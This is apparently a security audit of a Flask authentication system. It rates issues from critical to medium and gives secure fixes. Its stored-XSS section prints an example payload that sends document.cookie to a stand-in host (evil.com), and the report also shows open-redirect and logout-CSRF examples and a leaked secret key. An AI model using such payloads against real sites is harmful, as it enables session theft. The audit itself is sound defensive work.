# 🛡 Security Audit – Flask Authentication System (JrDev)

**Scope:** Authentication, session, CSRF, XSS, 2FA, configuration, rate limiting.  
**Assumption:** Production application.  
**References:** OWASP Top 10, OWASP Authentication Cheat Sheet.

---

## 🔎 Executive Summary

| Category | Status |
|----------|--------|
| **✅ Good** | Bcrypt for passwords, Flask-Login, CSRF token injection and use on login/register, TOTP 2FA flow present, role-based access, signed contract tokens. |
| **⚠️ Risky** | No global CSRF protection, many POST endpoints unprotected; session cookies not hardened; open redirect; 2FA bypass and not enforced on login; weak password policy. |
| **❌ Critical** | Hardcoded `SECRET_KEY`; `DEBUG=True` in run script; stored XSS via markdown (`|safe`); logout via GET (logout CSRF); no rate limiting on login/2FA. |

**Overall:** The app has a solid base (bcrypt, login/register forms with CSRF, 2FA scaffolding) but has critical gaps in secrets, CSRF coverage, session hardening, XSS, and brute-force protection. **Not production-ready as-is.**

---

## 🚨 Critical Issues

### 1. Hardcoded SECRET_KEY

**Location:** `backend/app/__init__.py` line 20.

**What’s wrong:**  
`SECRET_KEY` is hardcoded: `'5791628bb0b13ce0c676dfde280ba245'`.

**Why it’s dangerous:**  
Session cookies and CSRF tokens are signed with this key. If the key is in the repo (or a known value), anyone can forge sessions, impersonate users, and bypass CSRF. Same key across envs weakens isolation.

**Exploitation:**  
Clone repo → use same key to sign a session cookie for a chosen `user_id` → full account takeover.

**Secure fix:**

```python
# __init__.py
import os

def create_app():
    app = Flask(__name__)
    secret = os.environ.get('SECRET_KEY')
    if not secret and app.debug:
        app.logger.warning('SECRET_KEY not set; using dev-only default')
        secret = 'dev-only-change-in-production'
    if not secret and not app.debug:
        raise RuntimeError('SECRET_KEY must be set in production')
    app.config['SECRET_KEY'] = secret or os.urandom(32).hex()
    # ...
```

- Production: set `SECRET_KEY` in env (e.g. `openssl rand -hex 32`). Never commit it.

---

### 2. DEBUG enabled in run script

**Location:** `backend/run.py` line 7.

**What’s wrong:**  
`app.run(debug=True)` enables Flask debug mode.

**Why it’s dangerous:**  
Debug mode allows arbitrary code execution via the Werkzeug debugger (PIN or not). It also leaks stack traces and details in error pages (OWASP A01:2021 – Broken Access Control / A04:2021 – Insecure Design).

**Secure fix:**

```python
# run.py
import os

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    debug = os.environ.get('FLASK_DEBUG', 'false').lower() in ('1', 'true', 'yes')
    app.run(debug=debug, host='0.0.0.0' only if intended)
```

- Production: do **not** set `FLASK_DEBUG=1`; use a proper WSGI server (e.g. Gunicorn).

---

### 3. Stored XSS via Markdown (custom_markdown) rendered with `|safe`

**Locations:**  
- `backend/app/routes.py`: `md_html = markdown.markdown(profile.custom_markdown)` (dashboard and profile view).  
- `backend/app/templates/developer_dashboard.html` line 136: `{{ md_html|safe }}`.  
- `backend/app/templates/developer_profile_view.html` line 71: `{{ md_html | safe }}`.

**What’s wrong:**  
User-controlled `custom_markdown` is turned into HTML with `markdown.markdown()` (Python-Markdown does **not** strip raw HTML). That HTML is then rendered with `|safe`, so script and other dangerous HTML execute in the victim’s browser.

**Why it’s dangerous:**  
Stored XSS (OWASP A03:2021). Attacker can steal session cookies, perform actions as the victim, or phish other users viewing the profile.

**Exploitation example:**  
Set “About Me” to:

```html
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

Or use markdown that yields `<img src=x onerror="...">`. Anyone viewing that profile runs the script.

**Secure fix:**

- **Option A – Sanitize HTML after Markdown:** Use a whitelist-based sanitizer (e.g. Bleach) on the markdown output before rendering.

```python
# In routes or a small util module
import markdown
from bleach import Cleaner
from bleach.html5lib_shims import allowed_elements

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li', 'code', 'pre', 'h1', 'h2', 'h3']
ALLOWED_ATTRS = {'a': ['href', 'title'], 'img': ['src', 'alt']}

def safe_markdown_to_html(text):
    if not text:
        return ""
    raw = markdown.markdown(text, extensions=['extra'])
    cleaner = Cleaner(tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
    return cleaner.clean(raw)
```

Use `safe_markdown_to_html(profile.custom_markdown)` and keep `{{ md_html|safe }}` only because the output is now sanitized.

- **Option B – Disable raw HTML in Markdown:** Use an extension that prevents raw HTML from being output (see Python-Markdown docs). Prefer also sanitizing (Option A) for defense in depth.

- Ensure any other user-controlled HTML (e.g. in listings) is also sanitized or escaped; do not use `|safe` on unsanitized input.

---

### 4. Logout via GET (logout CSRF)

**Location:** `backend/app/routes.py` line 351–354.

**What’s wrong:**  
`@main.route("/logout")` with no `methods` defaults to GET. Logout is performed on a simple GET request.

**Why it’s dangerous:**  
An attacker can force a logged-in user to log out by loading a page that triggers a GET to `/logout` (e.g. `<img src="https://yoursite.com/logout">` or a link). Used for harassment or to force re-login and steal credentials via a fake login page.

**Secure fix:**

- Change logout to POST and require CSRF.

**routes.py:**

```python
@main.route("/logout", methods=['POST'])
def logout():
    logout_user()
    return redirect_after_action()
```

- Add a small form on the frontend (e.g. in layout/nav) that POSTs to `/logout` with `{{ form.hidden_tag() }}` or `csrf_token`, and style the submit as a “Log out” button/link (e.g. JavaScript to submit form on click).

- If you keep a “convenience” GET redirect for UX, it must only **redirect** to a “Confirm logout?” page that actually performs logout via POST; the GET route must **not** call `logout_user()`.

---

### 5. No global CSRF protection – many state-changing endpoints unprotected

**What’s wrong:**  
The app injects `csrf_token` via a context processor and uses `generate_csrf()` but **does not** register Flask-WTF’s `CSRFProtect(app)`. So CSRF is only checked where a **FlaskForm** is used with `validate_on_submit()` (e.g. login, register). All other POST/PUT/DELETE routes that use `request.form.get()` or JSON body are **not** validated for CSRF.

**Affected (examples):**  
`update_markdown`, `add_pinned_project`, `launch_sprint`, `join_listing`, `signup_accept`, `signup_deny`, `signup_sign_developer`, `signup_sign_business`, `signup_cancel`, `billing_create_setup_intent`, setup/verify 2FA forms, and any other POST that doesn’t use a FlaskForm.

**Why it’s dangerous:**  
CSRF (OWASP A01:2021). Attacker can craft a page that, when the victim visits it while logged in, submits a POST to e.g. `/update-markdown`, `/listing/1/join`, or `/signup/1/accept`, changing data or state on the victim’s behalf.

**Secure fix:**

- Enable global CSRF and send the token on every state-changing request.

**__init__.py:**

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

def create_app():
    app = Flask(__name__)
    # ... existing config ...
    csrf.init_app(app)
    # ...
```

- For **HTML forms** that don’t use FlaskForm, include the token:

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

- For **AJAX/JSON** (e.g. Stripe), send the token in a header (you already use `X-CSRFToken` in billing; with `CSRFProtect` it will be validated):

```javascript
'X-CSRFToken': document.getElementById('csrf-token').value
```

- Add the token to: `update_markdown` form, `add_pinned_project` form, setup_2fa, verify_2fa, launch_sprint, and any other custom forms. Exempt only if strictly necessary (e.g. webhook) and document it.

---

### 6. Open redirect after login / 2FA

**Locations:**  
- `backend/app/routes.py` lines 325–326 (verify_2fa), 345–346 (login).  
- `backend/app/utils.py` lines 12–14 (`redirect_after_action(allow_next=True)`).

**What’s wrong:**  
`next_page = request.args.get('next')` is used in `redirect(next_page)` without validating that the URL is relative or same-origin. An attacker can use e.g. `?next=https://evil.com` so that after login or 2FA the user is sent to a phishing site.

**Why it’s dangerous:**  
Open redirect (OWASP A01). Used for phishing and credential theft (user thinks they’re still on your domain).

**Secure fix:**

- Allow only relative paths or same-host URLs.

```python
from urllib.parse import urlparse

def is_safe_redirect_url(target):
    if not target or not target.strip():
        return False
    parsed = urlparse(target)
    return not parsed.netloc or parsed.netloc == request.host

# In login and verify_2fa:
next_page = request.args.get('next')
if next_page and is_safe_redirect_url(next_page):
    return redirect(next_page)
return redirect(url_for('main.dashboard'))
```

- Use the same helper wherever you redirect based on `request.args.get('next')`.

---

## ⚠️ Medium Risk Issues

### 7. Session cookie not hardened

**What’s wrong:**  
No `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SECURE`, or `SESSION_COOKIE_SAMESITE` (or `SESSION_COOKIE_SECURE` only in production) in app config.

**Why it’s dangerous:**  
- Without `HttpOnly`, JavaScript can read the session cookie (XSS → session theft).  
- Without `Secure` in production, cookie can be sent over HTTP.  
- Without `SameSite`, cross-site requests can send the cookie (helps with CSRF and cross-site abuse).

**Secure fix:**

```python
# __init__.py (in create_app)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'   # or 'Strict'
app.config['SESSION_COOKIE_SECURE'] = os.environ.get('FLASK_ENV') == 'production'
# Optional: session lifetime
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=12)
```

- Use `Secure=True` in production (HTTPS only). Use `Lax` unless you have a clear need for `Strict` or cross-site POSTs.

---

### 8. Session regeneration / fixation

**What’s wrong:**  
There is no explicit session regeneration after login (or after privilege change). Flask-Login can recreate the session id; doing it explicitly after login reduces session fixation risk.

**Secure fix:**  
After successful login (and after 2FA if you enforce it), regenerate the session:

```python
from flask import session
import os

# After login_user(user, ...)
session.regenerate()  # Flask 2.3+
# Or: session.clear(); session['_id'] = os.urandom(24).hex() and ensure new cookie is issued
```

- Prefer `session.regenerate()` if you’re on a Flask version that supports it; otherwise follow Flask’s recommended pattern for regenerating session id after login.

---

### 9. 2FA bypass and not enforced on login

**What’s wrong:**  
- **Skip 2FA:** `/skip-2fa` is GET and sets `current_user.is_verified = True` with no token, so anyone who hits it while logged in (or is tricked into opening it) bypasses 2FA.  
- **Login ignores 2FA:** In `login()`, after `bcrypt.check_password_hash` the code does `login_user(user, ...)` and redirects. It never checks `user.is_verified` or `user.two_factor_secret` and never redirects to `verify_2fa`. So 2FA is not enforced at all at login.  
- **verify_2fa** is only used if something previously set `session['2fa_user_id']`, but login never sets it.

**Why it’s dangerous:**  
2FA is effectively optional and can be skipped via a single GET. Attackers can skip it for new accounts or abuse “skip” to mark accounts “verified” without proving possession of the TOTP.

**Secure fix:**

- **Enforce 2FA at login when enabled:**  
  If `user.two_factor_secret` is set (and optionally `user.is_verified`), do **not** call `login_user()` in `login()`. Instead set `session['2fa_user_id'] = user.id` and redirect to `url_for('main.verify_2fa', next=request.args.get('next'))`. In `verify_2fa`, after valid TOTP, call `login_user(user)` and clear `session['2fa_user_id']`.
- **Remove or restrict skip_2fa:**  
  Either remove `/skip-2fa` or make it POST-only, require CSRF, and only allow it when the user has no 2FA secret yet (first-time setup). Do not allow GET.
- **Rate-limit 2FA verification** (see below).

---

### 10. 2FA verification and setup forms lack CSRF

**Locations:**  
`backend/app/templates/setup_2fa.html`, `backend/app/templates/verify_2fa.html`.

**What’s wrong:**  
The POST forms do not include `csrf_token` (or `form.hidden_tag()`). With global CSRF protection enabled, these will (correctly) fail until fixed; without it, they are currently not protected.

**Secure fix:**  
Add to both forms:

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

(Or use a FlaskForm that includes the token.) Then enable `CSRFProtect(app)` as in Critical #5.

---

### 11. No minimum password length or complexity

**Location:** `backend/app/forms.py` – RegistrationForm and LoginForm use `DataRequired()` only for password.

**What’s wrong:**  
Single-character or very weak passwords are allowed, easing brute force and credential stuffing.

**Secure fix:**  
Enforce minimum length and, if desired, complexity (e.g. OWASP guidelines):

```python
from wtforms.validators import DataRequired, Length, EqualTo, ValidationError, Regexp

# RegistrationForm
password = PasswordField('Password', validators=[
    DataRequired(),
    Length(min=10, message='Password must be at least 10 characters.'),
    Regexp(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)', message='Password must include upper, lower, and digit.')
])
```

- Adjust length and regex to your policy; consider using a dedicated “password strength” validator.

---

### 12. No rate limiting on login, 2FA, or registration

**What’s wrong:**  
Login, verify_2fa, setup_2fa, and register have no rate limiting. Attackers can brute-force passwords or 2FA codes and abuse registration.

**Why it’s dangerous:**  
Brute force (OWASP A07:2021). Especially dangerous with short or weak passwords and 6-digit TOTP.

**Secure fix:**  
Use Flask-Limiter (or similar) and apply limits per IP and per account where relevant:

```python
# __init__.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

def create_app():
    app = Flask(__name__)
    # ...
    limiter.init_app(app)
    return app

# routes.py
from app import limiter

@main.route("/login", methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def login():
    # ...

@main.route("/verify-2fa", methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def verify_2fa():
    # ...
```

- Add limits to register and setup_2fa; consider stricter limits after N failed logins (e.g. 3/minute) and optional account lockout.

---

### 13. Verification token uses bare `except`

**Location:** `backend/app/models.py` line 38–40.

**What’s wrong:**  
`verify_token` catches `except:` and returns `None`, hiding signature and expiry errors.

**Why it’s dangerous:**  
Debugging is harder; in edge cases, broad exception handling can hide bugs. Prefer catching specific exceptions (e.g. `BadSignature`, `BadData` from itsdangerous).

**Secure fix:**

```python
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

@staticmethod
def verify_token(token, expires_sec=1800):
    s = Serializer(current_app.config['SECRET_KEY'])
    try:
        payload = s.loads(token, salt='verification-salt', max_age=expires_sec)
        return User.query.get(payload['user_id'])
    except (BadSignature, SignatureExpired):
        return None
```

---

## 🟢 Good Practices Observed

- **Passwords:** Bcrypt via Flask-Bcrypt; no plaintext storage; `check_password_hash` used for comparison (constant-time in bcrypt).
- **Login/Register forms:** Use FlaskForm with `hidden_tag()` and `validate_on_submit()`, so CSRF is validated for those two routes.
- **Auth framework:** Flask-Login with `login_required` and role-based `require_role` decorator.
- **2FA:** TOTP (pyotp), secret stored per user; provisioning URI and verify flow present (needs enforcement and CSRF as above).
- **Contract links:** Signed tokens with itsdangerous and max_age (contract_view); good pattern for one-time or time-limited links.
- **Billing (Stripe):** Client-side sends `X-CSRFToken` for the setup intent (will be enforced once CSRFProtect is enabled); Stripe keys from environment.
- **Profile upload:** `secure_filename` used for profile picture.
- **Redirect after login:** Use of `next` is implemented; only the validation of `next` is missing (see Critical #6).

---

## 🔧 Recommended Improvements (Prioritized)

1. **Immediate (before any production use)**  
   - Move `SECRET_KEY` to environment; remove hardcoded value.  
   - Disable `debug` in production run script and use a production WSGI server.  
   - Fix stored XSS: sanitize markdown output (and/or disable raw HTML in markdown) and keep `|safe` only on sanitized output.  
   - Change logout to POST + CSRF; remove GET-triggered logout.  
   - Enable `CSRFProtect(app)` and add `csrf_token` to all state-changing forms and AJAX.  
   - Validate `next` redirects (relative or same-host only).

2. **Short term**  
   - Harden session cookies (HttpOnly, Secure in prod, SameSite).  
   - Regenerate session after login (and after 2FA if enforced).  
   - Enforce 2FA at login when `two_factor_secret` is set; remove or restrict GET `/skip-2fa`.  
   - Add rate limiting to login, 2FA, and register.  
   - Add password length and complexity validators.

3. **Ongoing**  
   - Implement secure password reset (time-limited token, no token in URL after use, rate limiting).  
   - Consider account lockout after N failed logins (with safe unlock path).  
   - Add security headers (CSP, X-Content-Type-Options, etc.).  
   - Ensure error pages and logging do not leak secrets or stack traces in production.

---

## 🧠 Security Maturity Score: **4 / 10**

**Justification:**  
Strong foundations (hashing, Flask-Login, CSRF on login/register, 2FA scaffolding, signed contract URLs) justify a score above 3. The score is limited by: hardcoded secret and debug mode (critical for production); stored XSS; missing global CSRF; GET logout; open redirect; 2FA not enforced and bypassable; no rate limiting; weak password policy; and missing session cookie hardening. Addressing the critical and medium issues would move the app toward a 6–7; adding reset flows, lockout, and headers would support 7+.

---

*End of audit. Implement fixes in a test environment first and re-test before production.*
